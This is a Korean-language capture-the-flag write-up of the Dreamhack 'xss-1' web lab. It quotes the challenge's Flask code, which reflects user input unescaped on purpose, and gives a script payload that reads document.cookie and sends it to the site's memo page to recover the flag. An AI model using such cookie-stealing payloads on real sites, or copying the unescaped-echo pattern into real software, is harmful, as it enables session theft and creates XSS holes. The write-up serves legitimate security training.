<!DOCTYPE html>
<html>
<head>
        <link rel="stylesheet" type="text/css" href="sytle.css">
</head>
<body>
        <h1>Dreamhack Web Hacking xss-1 Write-Up</h1>
</body>
<br>
<br>
</html>

문제 사이트로 들어가보자
![image](https://github.com/user-attachments/assets/05327431-7195-4fcf-ad16-037171489aea)
3개의 페이지로 이동할 수 있다.

하나하나 들어가보자.

먼저 vuln(xss) page로 들어가보았다.
![image](https://github.com/user-attachments/assets/27c2a80b-b6cf-4a3b-9b87-cf4d52b47c44)
흠 뭔지 잘 모르겠지만 스크립트를 작성할 수 있는 모양이다.

이어서 memo 페이지로 들어가 보았다.
![image](https://github.com/user-attachments/assets/38aa68bc-7035-4dc5-b284-c598e3ad8898)
hello라는 문구가 나오고 페이지에 새로 접속할 때마다 갯수가 늘어난다.

마지막으로 flag 페이지로 들어가보자.
![image](https://github.com/user-attachments/assets/78b9aec0-8d16-42c5-af4a-2f8e20a94334)
입력칸이 나온다. 일단 여기까지 살펴보고 문제 파일을 다운로드 받아 들어가 보자.

```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return param


@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'


memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)


app.run(host="0.0.0.0", port=8000)
```

쭉 살펴보니 ```/vuln```은 사용자가 어떤값을 입력해도 ```param``` 값을 출력한다.

그리고 ```/flag```는 GET과 POST 두가지 방식 요청을 처리하는데 GET 요청의 경우에는 ```flag.html```을 렌더링한다.

POST 요청의 경우에는 폼 데이터에서 ```param``` 값을 가져와 ```check_xss()``` 함수를 호출하고 ```/vuln```페이지에 쿠키를 포함시킨 요청을 보내고 그 결과를 반환하는 것을 알 수 있다. 

그리고 여기 ```check_xss()```함수가 하는 일은 ```read_url()```함수를 동작시켜 flag 쿠키를 생성 시키는 역할을 한다.

그렇다면 ```/memo```페이지에 생성한 쿠키값을 적도록 코드를 작성해서 ```/flag``` 페이지에 입력하보자

```python
<script> location.href="/memo?memo="+document.cookie; </script>
```

![image](https://github.com/user-attachments/assets/65fbc60d-8794-44c8-9618-ad24c76934a3)

![image](https://github.com/user-attachments/assets/828a1f52-6cdc-4cff-9fe7-eeec89e65d3c)

memo 페이지로 들어가보면 FLAG가 나와있다.
![image](https://github.com/user-attachments/assets/cba6478e-3603-49a5-b9c6-7d190fd63187)

